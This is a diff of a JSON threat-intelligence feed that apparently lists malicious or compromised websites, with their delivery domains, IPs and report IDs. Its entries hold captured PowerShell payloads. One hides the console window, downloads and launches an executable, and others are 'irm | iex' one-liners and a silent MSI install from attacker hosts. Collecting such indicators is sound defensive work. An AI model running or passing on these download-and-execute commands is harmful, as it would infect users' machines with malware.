@@ -1,5 +1,44 @@
 [
   {
+    "UrlDomain": "wistech.biz",
+    "DeliveryUrl": [
+      "fbifr.com"
+    ],
+    "PayloadUrl": [
+      "https://fbifr.com/eoN"
+    ],
+    "IP": [
+      "172.67.212.111"
+    ],
+    "Related": [],
+    "Payload": "$url = \"https://fbifr[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://fbifr.com/eoN"
+    ],
+    "ReportId": "cmwmcvfn81snn0oml5h11ww14",
+    "ScannedAt": "2026-11-18T16:48:42.514000+00:00"
+  },
+  {
+    "UrlDomain": "wstarymstylu.pl",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "94.152.13.78"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/dsy648ajd6ff/7f1bafa-a7c5-477b-a7e3-4f9dbab46292/-/raw/main/58C-4dC67f645812 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/dsy648ajd6ff/7f1bafa-a7c5-477b-a7e3-4f9dbab46292/-/raw/main/58C-4dC67f645812"
+    ],
+    "ReportId": "cmwmcr24e1slr0omlt0ye13yq",
+    "ScannedAt": "2026-11-18T16:45:18.406000+00:00"
+  },
+  {
     "UrlDomain": "www.sparkinnovationmarketing.com",
     "DeliveryUrl": [
       "browse-cloud.codes",
@@ -8528,46 +8567,5 @@
     ],
     "ReportId": "cmwgrz6qp0lwz0omly2u8bt21",
     "ScannedAt": "2026-11-14T19:04:54.671000+00:00"
-  },
-  {
-    "UrlDomain": "atharvarealties.com",
-    "DeliveryUrl": [
-      "softsyncizobrazie.net"
-    ],
-    "PayloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "IP": [
-      "91.108.98.209"
-    ],
-    "Related": [],
-    "Payload": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"http://softsyncizobrazie[.]net/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
-    "ResolvedDownloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "ReportId": "cmwgmq76i0lru0omlkr8mx6sp",
-    "ScannedAt": "2026-11-14T16:37:57.382000+00:00"
-  },
-  {
-    "UrlDomain": "rohrsupport.de",
-    "DeliveryUrl": [
-      "browse-cloud.codes"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "87.106.41.189"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-cloud.codes/a3a0979350a6065b",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/a3a0979350a6065b'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/a3a0979350a6065b"
-    ],
-    "ReportId": "cmwgmq2yd0lr20omlqz1zffk5",
-    "ScannedAt": "2026-11-14T16:37:51.895000+00:00"
   }
 ]
